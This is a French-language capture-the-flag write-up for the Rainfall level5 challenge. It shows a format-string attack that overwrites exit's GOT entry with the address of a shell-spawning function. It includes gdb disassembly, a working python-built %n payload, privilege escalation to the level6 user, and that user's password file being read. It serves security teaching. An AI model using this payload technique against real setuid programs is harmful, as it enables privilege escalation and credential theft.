# **Level 5**

Pour le `level5` on decompile le code

```
void o(void)

{
  system("/bin/sh");
                    // WARNING: Subroutine does not return
  _exit(1);
}



void n(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    // WARNING: Subroutine does not return
  exit(1);
}



void main(void)

{
  n();
  return;
}
```

On comprend qu'on doit toujours faire une `format strign attack` mais cette fois si il ne suffit de mofier la valeur d'une variable

On remarque que la fonction `o` lance `system('/bin/sh')`, ce qui veux dire que nous devons essayer d'acceder a `o`

Pour ce faire on remarque que la fonction `exit` est appele juste apres le `printf`. Ne serait-il pas possible qu'au lieu de diriger sur la vraifonction exit, on dirige l'appelle de `exit` vers `o`

> Evidemment que c'est possible [Got overwrite](https://www.youtube.com/watch?v=9SWYvhY5dYw)

Pour ce faire il faut acceder a la `Global Offset Table (GOT)` pour modifier ou le pointeur de exit mene

Tout d'abord il faut trouver l'addresse a modifier

```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838 <==
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```
L'addresse a modifier est donc 0x08049838

Maintenant il faut trouver par quoi la remplacer

```
(gdb) disas o
Dump of assembler code for function o:
=> 0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```
Maintenant qu'on a l'addresse de `o` on peux faire notre `format string attack`

Tout d'abord on recupere la position de l'addresse lorsque `printf` est appele

```
level5@RainFall:~$ python -c 'print"\x38\x98\x04\x08" + "%p "*10' > /var/crash/file
level5@RainFall:~$ cat /var/crash/file - | ./level5
80x200 0xb7fd1ac0 0xb7ff37d0 0x8049838 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```

Notre addresse est donc en 4eme position, donc nous pouvons construire notre payload sachant que `0x080484a4` est egale a `134513828` en decimal

```
level5@RainFall:~$ python -c 'print"\x38\x98\x04\x08" + "%134513824x%4$n"' > /var/crash/file
level5@RainFall:~$ cat /var/crash/file - | ./level5

.......

id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

> ### NEXT : [Level 6](/level6/resources/README.md)
